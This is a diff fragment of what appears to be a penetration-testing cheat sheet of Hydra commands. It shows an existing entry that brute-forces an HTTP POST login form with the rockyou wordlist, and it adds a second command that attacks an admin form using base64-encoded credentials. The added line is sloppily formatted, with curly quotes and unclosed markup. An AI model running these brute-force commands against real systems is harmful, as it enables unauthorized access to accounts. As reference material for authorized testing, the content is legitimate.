@@ -248,4 +248,7 @@
 50. **Brute force HTTP POST form with specific timeout (Port 80, included for completeness)**
     
     hydra -l admin -P /home/kali/wordlists/rockyou.txt 192.168.1.145 http-post-form "/login:username=^USER^&password=^PASS^:Invalid login" -t 4 -w 20
+
+51  **Base64 encode creds before send
+hydra -I -f -L wordlists.txt -P wordlists.txt “http-post-form://192.168.1.1:80/admin:username=^USER64^&password=^PASS64^:F=403”
     
